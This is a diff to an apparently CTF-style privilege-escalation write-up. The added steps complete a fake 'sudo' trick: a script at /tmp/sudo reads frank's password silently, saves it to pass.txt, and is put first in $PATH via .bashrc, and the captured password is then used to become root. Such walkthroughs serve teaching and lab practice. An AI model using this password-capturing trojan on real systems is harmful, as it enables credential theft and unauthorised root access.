@@ -23,7 +23,11 @@ While creating our sudo executable, we have to be a little bit creative. Trying 
         read -s pass # after executes the command, this will read the password entered by frank and store it in the pass variable  
         echo $pass > /home/frank/pass.txt # echoing the password from pass variable to pass.txt so that we can read it once catured.
         ```
-
+    3. `chmod +x /tmp/sudo`  
+    4. Modify you `$PATH` variable using `.bashrc`  
+    [bashrc](./img/bashrc.png")  
+    Save the changes and wait for a few seconds after which you will see a pass.txt which has the password
+    that can be used to switch to root.
 
 
 <p>
